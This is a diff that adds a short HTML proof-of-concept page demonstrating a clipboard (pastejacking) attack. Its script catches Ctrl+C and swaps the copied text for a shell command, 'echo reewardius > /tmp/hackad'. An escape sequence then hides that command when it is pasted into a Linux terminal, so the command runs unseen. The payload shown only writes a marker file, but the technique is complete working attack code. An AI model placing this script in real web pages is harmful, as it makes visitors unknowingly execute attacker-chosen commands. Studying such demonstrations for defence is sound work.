@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Page with copy-buffer hijacking script</title>
+  </head>
+  <body>
+    <h1>Page with copy-buffer hijacking script</h1>
+    <p>This page contains a JavaScript script that hijacks the copy-buffer of a Linux user when they press the Ctrl+C key combination.</p>
+
+    <script type="text/javascript">
+      document.addEventListener('keydown', function(event) {
+        var key = event.which || event.keyCode;
+        var ctrl = event.ctrlKey || event.metaKey;
+
+        if (ctrl && key === 67) {
+          // Get string that the user has highlighted
+          var userstring = window.getSelection().toString();
+          attack(userstring);
+        }
+      });
+
+      function attack(userstring) {
+        var textarea = document.createElement('textarea');
+        textarea.value = 'echo reewardius > /tmp/hackad;printf "\\033[2K";\r\n' + userstring;
+        document.body.appendChild(textarea);
+        textarea.focus();
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+      }
+    </script>
+  </body>
+</html>
